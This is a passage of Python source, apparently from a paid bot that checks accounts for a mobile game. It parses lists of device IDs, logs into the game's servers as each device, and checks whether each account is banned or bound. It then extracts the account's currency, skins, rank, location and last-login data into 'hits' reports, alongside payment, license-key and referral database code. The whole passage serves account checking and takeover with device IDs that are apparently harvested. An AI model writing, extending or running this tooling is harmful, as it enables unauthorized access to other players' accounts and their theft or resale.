        bio = player_data.get(24, "").strip() if isinstance(player_data.get(24), str) else ""
        likes = 0
        if role_info and isinstance(role_info, dict):
            likes = role_info.get(24, 0)
        if not likes:
            likes = player_data.get(61, 0)

        credits_score = "N/A"
        _cs_val = 0
        if role_info and isinstance(role_info, dict):
            _cs_val = role_info.get(20, 0)
        if _cs_val and isinstance(_cs_val, int) and _cs_val > 0:
            credits_score = f"{_cs_val}/110"
        else:
            _cs_fb = player_data.get(80, 0)
            if _cs_fb and isinstance(_cs_fb, int) and _cs_fb > 0:
                credits_score = f"{_cs_fb}/110"

        restriction_flags = "None"
        _t117 = None
        if role_info and isinstance(role_info, dict):
            _t117 = role_info.get(117)
        if _t117 is None:
            _t117 = player_data.get(117)
        if _t117 is not None:
            if isinstance(_t117, dict):
                _raw = _t117.get(0, 0)
            else:
                try:
                    _raw = int(_t117)
                except Exception:
                    _raw = 0
            _flag_count = int(_raw) + 1
            _pct = round((_flag_count / 7) * 100, 1)
            if _pct < 30:
                _risk, _risk_icon = "Low Risk", "OK"
            elif _pct < 60:
                _risk, _risk_icon = "Medium Risk", "WARN"
            else:
                _risk, _risk_icon = "High Risk", "HIGH"
            restriction_flags = f"{_pct}% {_risk_icon} ({_risk})"

        _t135 = player_data.get(135, {})
        _aff_level = _t135.get(1, 0) if isinstance(_t135, dict) else 0
        _AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver",
                         3: "Gold", 4: "Platinum", 5: "Diamond"}
        _aff_tier = _AFFINITY_MAP.get(_aff_level, f"Level {_aff_level}") if _aff_level else "None"
        _aff_names = []
        if role_info and isinstance(role_info, dict):
            _tag82 = role_info.get(82, [])
            if isinstance(_tag82, list):
                for _entry in _tag82:
                    if isinstance(_entry, dict):
                        _aff_name = _entry.get(2, "")
                        if _aff_name and isinstance(_aff_name, str):
                            _aff_names.append(_aff_name)
        affinity_label = ', '.join(_aff_names) if _aff_names else _aff_tier

        _skin_ts = player_data.get(176, 0)
        latest_skin_date = format_timestamp(_skin_ts) if _skin_ts else "N/A"
        _latest_skin_id = player_data.get(175, 0)
        latest_skin_id_str = str(_latest_skin_id) if _latest_skin_id else "N/A"

        _SL_TAGS = [21, 47, 50]
        _sl_expiry = 0
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            if role_info and isinstance(role_info, dict):
                _v = role_info.get(_sl_t, 0) or 0
                if isinstance(_v, int) and _v > 1700000000:
                    _sl_expiry = _v
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            _v = player_data.get(_sl_t, 0) or 0
            if isinstance(_v, int) and _v > 1700000000:
                _sl_expiry = _v
        if _sl_expiry:
            starlight_user = "Yes" if _sl_expiry > time.time() else "No"
            starlight_expiry = format_timestamp(_sl_expiry)
        else:
            starlight_user = "No"
            starlight_expiry = "N/A"

        starlight_months = player_data.get(60, 0)
        tickets = 0
        if role_info and isinstance(role_info, dict):
            tickets = role_info.get(49, 0)
        if not tickets:
            tickets = player_data.get(49, 0)

        total_wins = player_data.get(18, 0)
        _MIN_VALID_TS = 1451577600
        _create_ts_fallback = player_data.get(6, 0)
        if creation_ts and creation_ts >= _MIN_VALID_TS:
            creation_date = format_timestamp_full(creation_ts)
        elif _create_ts_fallback and _create_ts_fallback >= _MIN_VALID_TS:
            creation_date = format_timestamp_full(_create_ts_fallback)
        else:
            creation_date = "N/A"

        mcl_wins = 0
        if role_info and isinstance(role_info, dict):
            mcl_wins = role_info.get(46, 0)
        if not mcl_wins:
            mcl_wins = player_data.get(104, player_data.get(103, 0))

        win_count = 0
        if role_info and isinstance(role_info, dict):
            win_count = role_info.get(22, 0)
        total_battles = 0
        if role_info and isinstance(role_info, dict):
            total_battles = role_info.get(77, 0)
        if not total_battles:
            total_battles = player_data.get(17, 0)
        _wins_for_rate = win_count if win_count else total_wins
        if total_battles > 0 and _wins_for_rate > 0:
            _wr_val = (_wins_for_rate / total_battles) * 100
            win_rate = f"{min(_wr_val, 100):.1f}% (approx)" if _wr_val > 100 else f"{_wr_val:.1f}%"
        else:
            win_rate = "N/A"

        # Diamond extraction
        diamonds = 0
        bp = 0
        if role_info and isinstance(role_info, dict):
            _cr = role_info.get(111)
            if isinstance(_cr, dict):
                _d = _to_int_safe(_cr.get(0, _cr.get("0", 0)))
                _b = _to_int_safe(_cr.get(1, _cr.get("1", 0)))
                if _d:
                    diamonds = _d
                if _b:
                    bp = _b
            elif _cr is not None:
                _d = _to_int_safe(_cr)
                if _d:
                    diamonds = _d
        if not diamonds:
            _pd111 = player_data.get(111)
            if isinstance(_pd111, dict):
                _d = _to_int_safe(_pd111.get(0, _pd111.get("0", 0)))
                _b = _to_int_safe(_pd111.get(1, _pd111.get("1", 0)))
                if _d:
                    diamonds = _d
                if _b and not bp:
                    bp = _b
            elif _pd111 is not None:
                _d = _to_int_safe(_pd111)
                if _d:
                    diamonds = _d
        if not diamonds:
            for _cand_tag in (129, 86, 130, 85, 108, 112, 116, 120, 118, 122, 123):
                _cand = player_data.get(_cand_tag)
                _d = _to_int_safe(_cand)
                if _d and 0 < _d < 100_000_000:
                    diamonds = _d
                    break
        if not diamonds and role_info and isinstance(role_info, dict):
            for _cand_tag in (129, 86, 130, 108, 112, 118, 120, 122):
                _cand = role_info.get(_cand_tag)
                _d = _to_int_safe(_cand)
                if _d and 0 < _d < 100_000_000:
                    diamonds = _d
                    break
        if not bp:
            _bp_cand = _to_int_safe(player_data.get(83))
            if _bp_cand and _bp_cand < 10_000_000:
                bp = _bp_cand
        if not bp and role_info and isinstance(role_info, dict):
            _bp_cand = _to_int_safe(role_info.get(83))
            if _bp_cand and _bp_cand < 10_000_000:
                bp = _bp_cand

        last_diamond_purchase = "N/A"
        _diamond_buy_ts = player_data.get(42, 0)
        if _diamond_buy_ts and isinstance(_diamond_buy_ts, int) and _diamond_buy_ts > 1000000000:
            last_diamond_purchase = format_timestamp(_diamond_buy_ts)

        starlight_count = 0
        if role_info and isinstance(role_info, dict):
            starlight_count = role_info.get(60, 0)

        skin_counts = {"Supreme Skins": 0, "Grand Skins": 0, "Exquisite Skins": 0,
                       "Deluxe Skins": 0, "Exceptional Skins": 0, "Common Skins": 0}
        _tag118 = None
        if role_info and isinstance(role_info, dict):
            _tag118 = role_info.get(118)
        if not _tag118:
            _tag118 = player_data.get(118)
        if _tag118:
            if isinstance(_tag118, dict):
                skin_data = _tag118.get(4, _tag118.get('4', {}))
                if isinstance(skin_data, dict):
                    skin_types = {6: "Supreme Skins", 5: "Grand Skins",
                                  4: "Exquisite Skins", 3: "Deluxe Skins",
                                  2: "Exceptional Skins", 1: "Common Skins"}
                    for skin_id, count in skin_data.items():
                        if skin_id in skin_types:
                            skin_counts[skin_types[skin_id]] = count

        return {
            'nickname': nickname, 'player_id': player_id, 'server': server,
            'level': level, 'skin_count': skin, 'hero_count': hero_count,
            'matches': matches, 'rating_score': rating_score,
            'location': location, 'last_login': last_login_formatted,
            'last_login_ts': last_login,
            'last_login_country': last_login_country,
            'create_account_country': create_account_country,
            'high_rank': high_rank, 'current_rank': current_rank,
            'achievement_points': achievement_points,
            'collector_point': collector_point, 'collector_rank': collector_rank,
            'collector_tier': collector_tier,
            'hero_history': hero_history, 'squad': squad,
            'squad_id': squad_id_display,
            'skin_breakdown': skin_counts, 'affinity': affinity_label,
            'likes': likes,
            'credits_score': credits_score if credits_score and credits_score != "N/A" else None,
            'followers': followers, 'popularity': popularity,
            'bio': bio if bio else None,
            'latest_skin_date': latest_skin_date,
            'starlight_user': starlight_user,
            'starlight_expiry': starlight_expiry,
            'starlight_months': starlight_months if starlight_months else None,
            'tickets': tickets if tickets else None,
            'total_wins': total_wins if total_wins else None,
            'restriction_flags': restriction_flags,
            'mcl_champion_wins': mcl_wins, 'v2l_status': v2l_status,
            'creation_date': creation_date,
            'win_count': win_count, 'total_battles': total_battles,
            'win_rate': win_rate, 'battle_points': bp if bp else None,
            'diamonds': diamonds,
            'last_diamond_purchase': last_diamond_purchase if last_diamond_purchase != "N/A" else None,
            'starlight_count': starlight_count if starlight_count else None,
            'latest_skin_id': latest_skin_id_str if latest_skin_id_str != "N/A" else None,
        }
    except Exception:
        return None
# ======================================================================
#  DETAIL PIPELINE
# ======================================================================
def process_detail(device_id, account_id=None, zone_id=None):
    conn = None
    try:
        conn = GameConnection(device_id=device_id)
        conn.connect()

        if not conn.login_to_login_server():
            bs = conn.ban_status
            try:
                conn.cleanup()
            except Exception:
                pass
            return False, None, bs

        acc_id = conn.account_id
        zone = conn.zone_id

        if account_id and zone_id:
            acc_id = int(account_id)
            zone = int(zone_id)

        if not conn.get_game_server():
            try:
                conn.cleanup()
            except Exception:
                pass
            return False, None, "GS_FAIL"

        try:
            gs_ok = conn.connect_to_game_server()
        except socket.timeout:
            try:
                conn.cleanup()
            except Exception:
                pass
            return False, None, "GS_TIMEOUT"
        except Exception as e:
            try:
                conn.cleanup()
            except Exception:
                pass
            return False, None, f"GS_EXC:{type(e).__name__}"

        if not gs_ok:
            try:
                conn.cleanup()
            except Exception:
                pass
            return False, None, "GS_CONNECT_FAIL"

        ban_stat = conn.check_ban_status()
        if 'ban' in str(ban_stat).lower():
            try:
                conn.cleanup()
            except Exception:
                pass
            return False, None, str(ban_stat)

        v2l = get_v2l_status(conn, acc_id, zone)

        result = conn.lookup_player(acc_id)
        role_info = conn.get_role_info(acc_id, zone)
        skin_info = conn.get_skin_role_info(acc_id, zone)

        pd = {}
        if result and isinstance(result, dict):
            arr = result.get(0)
            if isinstance(arr, list) and arr and isinstance(arr[0], dict):
                pd = arr[0]
            elif isinstance(arr, dict):
                pd = arr
            else:
                pd = result

        skin_info = skin_info if isinstance(skin_info, dict) else {}
        role_info = role_info if isinstance(role_info, dict) else {}

        nick = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{acc_id}"
        level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
        skin_cnt = skin_info.get(10) if skin_info and skin_info.get(10) is not None else pd.get(83, 0)
        hero_cnt = (skin_info.get(9) if skin_info and skin_info.get(9) is not None
                    else (role_info.get(9) if role_info and role_info.get(9) is not None else 0))
        cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
        max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0

        creation_ts = pd.get(42) or conn.creation_ts or 0
        created_at = "N/A"
        if creation_ts and creation_ts > 1000000000:
            created_at = format_timestamp_full(creation_ts)

        tag_136 = pd.get(136, {})
        collector_point = tag_136.get(9, 0) if isinstance(tag_136, dict) else 0
        collector_rank = tag_136.get(10, 0) if isinstance(tag_136, dict) else 0
        collector_tier = map_collector_point(collector_point)

        skin_counts = {"Supreme Skins": 0, "Grand Skins": 0, "Exquisite Skins": 0,
                       "Deluxe Skins": 0, "Exceptional Skins": 0, "Common Skins": 0}
        _tag118 = pd.get(118)
        if _tag118 and isinstance(_tag118, dict):
            skin_data = _tag118.get(4, _tag118.get('4', {}))
            if isinstance(skin_data, dict):
                skin_types = {6: "Supreme Skins", 5: "Grand Skins", 4: "Exquisite Skins",
                              3: "Deluxe Skins", 2: "Exceptional Skins", 1: "Common Skins"}
                for skin_id, count in skin_data.items():
                    if skin_id in skin_types:
                        skin_counts[skin_types[skin_id]] = count

        tag_91 = pd.get(91, [])
        hero_history = ([HERO_ID_MAP.get(hid, f"Unknown({hid})") for hid in reversed(tag_91)]
                        if tag_91 else ["Private / Not Available"])

        last_login = pd.get(5, 0)
        last_login_formatted = format_timestamp(last_login) if last_login else "N/A"

        location = "NOT FOUND"
        loc_data = pd.get(71, None)
        if loc_data and isinstance(loc_data, list) and len(loc_data) >= 2:
            location = ", ".join(str(x) for x in loc_data)

        squad_icon = pd.get(31, "")
        squad_name = pd.get(30, "").replace("`", "").strip() if isinstance(pd.get(30), str) else ""
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "-"
        squad_id_raw = role_info.get(34, 0) or pd.get(34, pd.get(28, 0)) or 0
        try:
            squad_id = int(squad_id_raw)
        except Exception:
            squad_id = 0

        restriction_flags = "None"
        _t117 = role_info.get(117) if role_info else pd.get(117)
        if _t117 is not None:
            if isinstance(_t117, dict):
                _raw = _t117.get(0, 0)
            else:
                try:
                    _raw = int(_t117)
                except Exception:
                    _raw = 0
            _flag_count = int(_raw) + 1
            _pct = round((_flag_count / 7) * 100, 1)
            if _pct < 30:
                _risk, _risk_icon = "Low Risk", "OK"
            elif _pct < 60:
                _risk, _risk_icon = "Medium Risk", "WARN"
            else:
                _risk, _risk_icon = "High Risk", "HIGH"
            restriction_flags = f"{_pct}% {_risk_icon} ({_risk})"

        _t135 = pd.get(135, {})
        _aff_level = _t135.get(1, 0) if isinstance(_t135, dict) else 0
        _AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold", 4: "Platinum", 5: "Diamond"}
        affinity_label = _AFFINITY_MAP.get(_aff_level, f"Level {_aff_level}") if _aff_level else "None"

        _SL_TAGS = [21, 47, 50]
        _sl_expiry = 0
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            _v = role_info.get(_sl_t, 0) if role_info else 0
            if isinstance(_v, int) and _v > 1700000000:
                _sl_expiry = _v
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            _v = pd.get(_sl_t, 0) or 0
            if isinstance(_v, int) and _v > 1700000000:
                _sl_expiry = _v
        if _sl_expiry:
            starlight_user = "Yes" if _sl_expiry > time.time() else "No"
            starlight_expiry = format_timestamp(_sl_expiry)
        else:
            starlight_user = "No"
            starlight_expiry = "N/A"

        diamonds = 0
        bp = 0
        _cr = role_info.get(111) if role_info else None
        if isinstance(_cr, dict):
            _d = _cr.get(0, _cr.get("0", 0))
            _b = _cr.get(1, _cr.get("1", 0))
            if isinstance(_d, (int, float)):
                diamonds = int(_d)
            if isinstance(_b, (int, float)):
                bp = int(_b)

        player_data = {
            'nickname': nick,
            'player_id': acc_id,
            'server': zone,
            'level': level,
            'skin_count': skin_cnt,
            'hero_count': hero_cnt,
            'current_rank': map_rank(cur_rank_val),
            'high_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
            'collector_point': collector_point,
            'collector_rank': collector_rank,
            'collector_tier': collector_tier,
            'ban_status': ban_stat,
            'v2l_status': v2l,
            'creation_date': created_at,
            'last_login': last_login_formatted,
            'last_login_ts': last_login,
            'location': location,
            'squad': squad,
            'squad_id': f"Squad ID: {squad_id}" if squad_id else "N/A",
            'restriction_flags': restriction_flags,
            'affinity': affinity_label,
            'starlight_user': starlight_user,
            'starlight_expiry': starlight_expiry,
            'skin_breakdown': skin_counts,
            'hero_history': hero_history,
            'diamonds': diamonds,
            'battle_points': bp if bp else None,
            'achievement_points': pd.get(7, 0),
            'rating_score': pd.get(9, 0),
            'matches': pd.get(17, 0),
            'win_count': 0,
            'total_battles': pd.get(17, 0),
            'total_wins': pd.get(18, 0),
            'win_rate': "N/A",
            'mcl_champion_wins': 0,
            'followers': pd.get(15, 0),
            'likes': pd.get(61, 0),
            'popularity': pd.get(14, 0),
            'bio': pd.get(24, "").strip() if isinstance(pd.get(24), str) else None,
            'credits_score': None,
            'latest_skin_date': "N/A",
            'latest_skin_id': None,
            'starlight_months': pd.get(60, 0) or None,
            'starlight_count': role_info.get(60, 0) if role_info else None,
            'tickets': pd.get(49, 0) or None,
            'last_diamond_purchase': None,
            'last_login_country': pd.get(87, "Unknown"),
            'create_account_country': pd.get(97, "Unknown"),
        }

        try:
            conn.cleanup()
        except Exception:
            pass
        return True, player_data, ban_stat

    except Exception as e:
        try:
            if conn:
                conn.cleanup()
        except Exception:
            pass
        return False, None, f"EXC:{type(e).__name__}"


# ======================================================================
#  CLEAN DEVICE IDS
# ======================================================================
DEVICE_ID_PATTERN_LOOSE = re.compile(r"\b((?:and_|ios_)[A-Za-z0-9_\-]+)", re.IGNORECASE)
LINE_PATTERN_FULL = re.compile(
    r"Device\s*id\s*[:\-]\s*((?:and_|ios_)[^\s|]+)"
    r"(?:\s*\|\s*account\s*id\s*[:\-]\s*(\d+))?"
    r"(?:\s*\|\s*zone\s*id\s*[:\-]\s*(\d+))?",
    re.IGNORECASE
)


def clean_device_ids_from_text(text, keep_only_ids=False):
    stats = {"raw_lines": 0, "found_full": 0, "found_id_only": 0, "unique": 0, "duplicates": 0}
    results = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        stats["raw_lines"] += 1
        m = LINE_PATTERN_FULL.search(line)
        if m:
            device = m.group(1).strip()
            role_id = int(m.group(2)) if m.group(2) else None
            zone_id = int(m.group(3)) if m.group(3) else None
            if device in seen:
                stats["duplicates"] += 1
                continue
            seen.add(device)
            if role_id and zone_id:
                stats["found_full"] += 1
            else:
                stats["found_id_only"] += 1
            if keep_only_ids:
                results.append(device)
            else:
                results.append({"device": device, "role_id": role_id, "zone_id": zone_id})
            continue
        m2 = DEVICE_ID_PATTERN_LOOSE.search(line)
        if m2:
            device = m2.group(1).strip()
            if device in seen:
                stats["duplicates"] += 1
                continue
            seen.add(device)
            stats["found_id_only"] += 1
            if keep_only_ids:
                results.append(device)
            else:
                results.append({"device": device, "role_id": None, "zone_id": None})
    stats["unique"] = len(results)
    return results, stats


def build_hit_txt(device_id, role_id, zone_id, pd, banned_status=None):
    days = _offline_days(pd.get("last_login_ts", 0))
    days_str = f"{days} day(s)" if days is not None else "N/A"
    skin_bd = pd.get('skin_breakdown', {}) or {}
    hero_history = pd.get('hero_history', []) or []
    hero_history_str = ", ".join(str(h) for h in hero_history[:15]) if hero_history else "N/A"
    lines = [
        "=" * 60,
        f"Device ID: {device_id}",
        f"Account ID: {role_id}",
        f"Zone ID: {zone_id}",
        "=" * 60,
        "----- BASIC INFO -----",
        f"Name: {pd.get('nickname', 'N/A')}",
        f"Player ID: {pd.get('player_id', 'N/A')}",
        f"Server: {pd.get('server', 'N/A')}",
        f"Level: {pd.get('level', 'N/A')}",
        f"Rating Score: {pd.get('rating_score', 0)}",
        f"Hero Count: {pd.get('hero_count', 0)}",
        f"Skin Count: {pd.get('skin_count', 0)}",
        f"Matches: {pd.get('matches', 0)}",
        f"Win Count: {pd.get('win_count', 0)}",
        f"Total Battles: {pd.get('total_battles', 0)}",
        f"Total Wins: {pd.get('total_wins', 0) or 0}",
        f"Win Rate: {pd.get('win_rate', 'N/A')}",
        f"MCL Champion Wins: {pd.get('mcl_champion_wins', 0)}",
        "",
        "----- RANK -----",
        f"Current Rank: {pd.get('current_rank', 'N/A')}",
        f"Max Rank: {pd.get('high_rank', 'N/A')}",
        f"Achievement Points: {pd.get('achievement_points', 0)}",
        "",
        "----- COLLECTION / SKINS -----",
        f"  - Supreme: {skin_bd.get('Supreme Skins', 0)}",
        f"  - Grand: {skin_bd.get('Grand Skins', 0)}",
        f"  - Exquisite: {skin_bd.get('Exquisite Skins', 0)}",
        f"  - Deluxe: {skin_bd.get('Deluxe Skins', 0)}",
        f"  - Exceptional: {skin_bd.get('Exceptional Skins', 0)}",
        f"  - Common: {skin_bd.get('Common Skins', 0)}",
        f"Collector Point: {pd.get('collector_point', 0)}",
        f"Collector Rank: {pd.get('collector_rank', 0)}",
        f"Collector Tier: {pd.get('collector_tier', 'N/A')}",
        f"Latest Skin ID: {pd.get('latest_skin_id') or 'N/A'}",
        f"Latest Skin Date: {pd.get('latest_skin_date', 'N/A')}",
        "",
        "----- CURRENCY -----",
        f"Diamonds: {pd.get('diamonds', 0)}",
        f"Battle Points: {pd.get('battle_points', 0) or 0}",
        f"Tickets: {pd.get('tickets', 0) or 0}",
        f"Last Diamond Purchase: {pd.get('last_diamond_purchase') or 'N/A'}",
        "",
        "----- STARLIGHT -----",
        f"Starlight User: {pd.get('starlight_user', 'No')}",
        f"Starlight Expiry: {pd.get('starlight_expiry', 'N/A')}",
        f"Starlight Months: {pd.get('starlight_months') or 0}",
        f"Starlight Count: {pd.get('starlight_count') or 0}",
        "",
        "----- SOCIAL / PROFILE -----",
        f"Squad: {pd.get('squad', '-')}",
        f"Squad ID: {pd.get('squad_id', 'N/A')}",
        f"Followers: {pd.get('followers', 0)}",
        f"Likes: {pd.get('likes', 0)}",
        f"Popularity: {pd.get('popularity', 0)}",
        f"Affinity: {pd.get('affinity', 'N/A')}",
        f"Credits Score: {pd.get('credits_score') or 'N/A'}",
        f"Bio: {pd.get('bio') or 'N/A'}",
        "",
        "----- SECURITY / STATUS -----",
        f"V2L Status: {pd.get('v2l_status', 'N/A')}",
        f"Restriction Flags: {pd.get('restriction_flags', 'None')}",
        "",
        "----- LOCATION / TIME -----",
        f"Location: {pd.get('location', 'NOT FOUND')}",
        f"Last Login: {pd.get('last_login', 'N/A')}",
        f"Last Login Country: {pd.get('last_login_country', 'Unknown')}",
        f"Create Account Country: {pd.get('create_account_country', 'Unknown')}",
        f"Offline Days: {days_str}",
        f"Creation Date: {pd.get('creation_date', 'N/A')}",
        "",
        "----- HERO HISTORY -----",
        f"{hero_history_str}",
    ]
    if banned_status is not None:
        lines.append("")
        lines.append(f"BANNED: {'TRUE' if banned_status else 'FALSE'}")
    lines.append("=" * 60)
    return "\n".join(lines)


# ======================================================================
#  DATABASE
# ======================================================================
_db_lock = threading.Lock()


# ======================================================================
#  PLANS / PAYMENT DB
# ======================================================================
def db_create_pending_payment(user_id, plan_key, pay_method, screenshot_file_id):
    """Create a pending payment record."""
    plan = PLANS.get(plan_key)
    if not plan:
        return None
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        cur = c.execute("""INSERT INTO pending_payments
            (user_id, plan_key, plan_name, plan_days, plan_price,
             pay_method, screenshot_file_id, status, created_at)
            VALUES (?,?,?,?,?,?,?,?,?)""",
            (user_id, plan_key, plan["name"], plan["days"], plan["price"],
             pay_method, screenshot_file_id, "PENDING", now))
        return cur.lastrowid


def db_get_pending_payment(payment_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("""SELECT id, user_id, plan_key, plan_name, plan_days,
            plan_price, pay_method, screenshot_file_id, status, created_at,
            reviewed_at, reviewed_by, note
            FROM pending_payments WHERE id=?""", (payment_id,)).fetchone()
    if not row:
        return None
    return {
        "id": row[0], "user_id": row[1], "plan_key": row[2],
        "plan_name": row[3], "plan_days": row[4], "plan_price": row[5],
        "pay_method": row[6], "screenshot_file_id": row[7],
        "status": row[8], "created_at": row[9],
        "reviewed_at": row[10], "reviewed_by": row[11], "note": row[12],
    }


def db_update_payment_status(payment_id, status, reviewer_id=0, note=""):
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""UPDATE pending_payments
            SET status=?, reviewed_at=?, reviewed_by=?, note=?
            WHERE id=?""",
            (status, now, reviewer_id, note, payment_id))


def db_list_pending_payments(limit=30):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        rows = c.execute("""SELECT id, user_id, plan_name, plan_price,
            pay_method, created_at FROM pending_payments
            WHERE status='PENDING' ORDER BY created_at DESC LIMIT ?""",
            (limit,)).fetchall()
    return rows


def db_list_all_payments(limit=100):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        rows = c.execute("""SELECT id, user_id, plan_name, plan_price,
            pay_method, status, created_at FROM pending_payments
            ORDER BY created_at DESC LIMIT ?""", (limit,)).fetchall()
    return rows


# ======================================================================
#  REFERRAL DB
# ======================================================================
def db_set_referral(user_id, referrer_id):
    """Record referral AND reward referrer IMMEDIATELY.
    Returns True if referral was recorded."""
    if user_id == referrer_id:
        print(f"[REF] Self-referral blocked: {user_id}")
        return False
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        # Check if already referred
        row = c.execute("SELECT referrer_id FROM user_referral WHERE user_id=?",
                        (user_id,)).fetchone()
        if row:
            print(f"[REF] User {user_id} already referred by {row[0]}")
            return False
        # Check referrer exists
        ref_row = c.execute("SELECT user_id FROM users WHERE user_id=?",
                            (referrer_id,)).fetchone()
        if not ref_row:
            print(f"[REF] Referrer {referrer_id} not in users table")
            return False
        # Insert referral record — REWARDED IMMEDIATELY
        c.execute("""INSERT INTO user_referral(user_id, referrer_id, referred_at, rewarded)
                     VALUES (?, ?, ?, 1)""", (user_id, referrer_id, now))
        # Update referrer stats immediately
        c.execute("""INSERT INTO referral_stats(user_id, total_referrals, checks_earned, checks_used)
                     VALUES (?, 1, 1, 0)
                     ON CONFLICT(user_id) DO UPDATE SET
                        total_referrals = total_referrals + 1,
                        checks_earned = checks_earned + 1""",
                  (referrer_id,))
    print(f"[REF] ✅ Rewarded referrer {referrer_id} (+1) — from user {user_id}")
    return True



def db_get_referrer(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("SELECT referrer_id, rewarded FROM user_referral WHERE user_id=?",
                        (user_id,)).fetchone()
    if not row:
        return None
    return {"referrer_id": row[0], "rewarded": row[1]}


def db_reward_referrer(user_id, reward_checks=1):
    """Called when a referred user does their FIRST check.
    Reward the referrer with free check credits.
    Returns referrer_id on success, None on failure."""
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        # 1. Get referral record
        row = c.execute(
            "SELECT referrer_id, rewarded FROM user_referral WHERE user_id=?",
            (user_id,)).fetchone()
        if not row:
            print(f"[REF] No referral record for user {user_id}")
            return None
        referrer_id, rewarded = row
        if rewarded:
            print(f"[REF] User {user_id} already rewarded referrer {referrer_id}")
            return None

        # 2. Mark as rewarded
        c.execute("UPDATE user_referral SET rewarded=1 WHERE user_id=?", (user_id,))

        # 3. Update referrer stats (insert or update)
        c.execute("""INSERT INTO referral_stats(user_id, total_referrals, checks_earned, checks_used)
                     VALUES (?, 1, ?, 0)
                     ON CONFLICT(user_id) DO UPDATE SET
                        total_referrals = total_referrals + 1,
                        checks_earned = checks_earned + ?""",
                  (referrer_id, reward_checks, reward_checks))

    print(f"[REF] ✅ Referrer {referrer_id} rewarded +{reward_checks} (from user {user_id})")
    return referrer_id



def db_get_referral_stats(user_id):
    """Get referral stats. Always returns valid dict."""
    try:
        with _db_lock, sqlite3.connect(DB_PATH) as c:
            row = c.execute("""SELECT total_referrals, checks_earned, checks_used
                FROM referral_stats WHERE user_id=?""", (user_id,)).fetchone()
    except Exception as e:
        print(f"[REF] stats query fail: {e}")
        return {"total_referrals": 0, "checks_earned": 0, "checks_used": 0}
    if not row:
        return {"total_referrals": 0, "checks_earned": 0, "checks_used": 0}
    return {
        "total_referrals": int(row[0] or 0),
        "checks_earned": int(row[1] or 0),
        "checks_used": int(row[2] or 0),
    }


def db_use_referral_credit(user_id):
    """Use 1 referral credit for a check."""
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("""SELECT checks_earned, checks_used
            FROM referral_stats WHERE user_id=?""", (user_id,)).fetchone()
        if not row:
            return False
        earned, used = row
        if used >= earned:
            return False
        c.execute("""UPDATE referral_stats SET checks_used = checks_used + 1
                     WHERE user_id=?""", (user_id,))
    return True


def db_has_referral_credit(user_id):
    stats = db_get_referral_stats(user_id)
    return stats["checks_used"] < stats["checks_earned"]


def db_count_referrals(user_id):
    stats = db_get_referral_stats(user_id)
    return stats["total_referrals"]



def db_init():
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT,
            first_seen INTEGER, last_seen INTEGER, is_banned INTEGER DEFAULT 0,
            temp_ban_until INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, device_id TEXT, account_id INTEGER, zone_id INTEGER,
            nickname TEXT, level INTEGER, skin_count INTEGER,
            collector_tier TEXT, collector_base TEXT, collector_roman TEXT,
            current_rank TEXT, high_rank TEXT, diamonds INTEGER, v2l_status TEXT,
            last_login_ts INTEGER DEFAULT 0, banned INTEGER DEFAULT 0,
            created_at INTEGER, source TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_hits_user ON hits(user_id);
        CREATE TABLE IF NOT EXISTS checks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, check_type TEXT, total INTEGER, valid INTEGER,
            banned INTEGER, errors INTEGER, created_at INTEGER, summary_txt TEXT
        );
        CREATE TABLE IF NOT EXISTS keys (
            key TEXT PRIMARY KEY, days INTEGER, max_uses INTEGER DEFAULT 1,
            uses INTEGER DEFAULT 0, created_by INTEGER, created_at INTEGER,
            bound_user INTEGER DEFAULT 0, bound_at INTEGER DEFAULT 0, note TEXT
        );
        CREATE TABLE IF NOT EXISTS user_access (
            user_id INTEGER PRIMARY KEY,
            trial_used INTEGER DEFAULT 0, trial_started INTEGER DEFAULT 0,
            trial_until INTEGER DEFAULT 0, key_active INTEGER DEFAULT 0,
            key_until INTEGER DEFAULT 0, last_key TEXT DEFAULT '',
            notified_expired INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS extra_admins (
            user_id INTEGER PRIMARY KEY,
            added_by INTEGER, added_at INTEGER, note TEXT
        );
        CREATE TABLE IF NOT EXISTS pending_payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, plan_key TEXT, plan_name TEXT, plan_days INTEGER,
            plan_price INTEGER, pay_method TEXT,
            screenshot_file_id TEXT,
            status TEXT DEFAULT 'PENDING',
            created_at INTEGER, reviewed_at INTEGER, reviewed_by INTEGER,
            note TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_pending_user ON pending_payments(user_id);
        CREATE INDEX IF NOT EXISTS idx_pending_status ON pending_payments(status);

        CREATE TABLE IF NOT EXISTS user_referral (
            user_id INTEGER PRIMARY KEY,
            referrer_id INTEGER DEFAULT 0,
            referred_at INTEGER DEFAULT 0,
            rewarded INTEGER DEFAULT 0
        );

